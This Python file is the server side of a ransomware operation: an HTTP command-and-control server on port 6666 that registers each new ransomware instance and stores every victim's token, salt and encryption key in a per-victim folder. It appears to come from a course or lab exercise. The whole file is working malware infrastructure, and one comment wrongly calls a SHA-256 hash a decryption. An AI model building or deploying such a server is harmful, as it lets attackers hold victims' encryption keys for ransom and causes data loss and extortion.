import base64
from hashlib import sha256
import hashlib
from http.server import HTTPServer
import os

from cncbase import CNCBase

class CNC(CNCBase):
    ROOT_PATH = "/root/CNC"

    def save_b64(self, token:str, data:str, filename:str):
        # helper
        # token and data are base64 field

        bin_data = base64.b64decode(data)
        path = os.path.join(CNC.ROOT_PATH, token, filename)
        with open(path, "wb") as f:
            f.write(bin_data)

    def post_new(self, path: str, params: dict, body: dict) -> dict:
        # Function to register a new ransomware instance
        token_value = body["token"]  # Retrieve the token
        self._log.info(f"TOKEN: {token_value}")
        salt_value = body["salt"]  # Retrieve the salt
        key_value = body["key"]  # Retrieve the key
        decrypted_token = hashlib.sha256(base64.b64decode(token_value)).hexdigest()  # Decrypt the token
        victim_folder = os.path.join(CNC.ROOT_PATH, decrypted_token)  # Create the path for the victim's folder
        os.makedirs(victim_folder, exist_ok=True)  # Create the victim's folder

        # Save the salt and key in the victim's folder
        with open(os.path.join(victim_folder, "salt"), "w") as salt_file:
            salt_file.write(salt_value)
        with open(os.path.join(victim_folder, "key"), "w") as key_file:
            key_file.write(key_value)

        # Return a dictionary containing the request status (success or error)
        if os.path.isdir(victim_folder):
            return {"status": "Success"}
        else:
            return {"status": "Error"}


           
httpd = HTTPServer(('0.0.0.0', 6666), CNC)
httpd.serve_forever()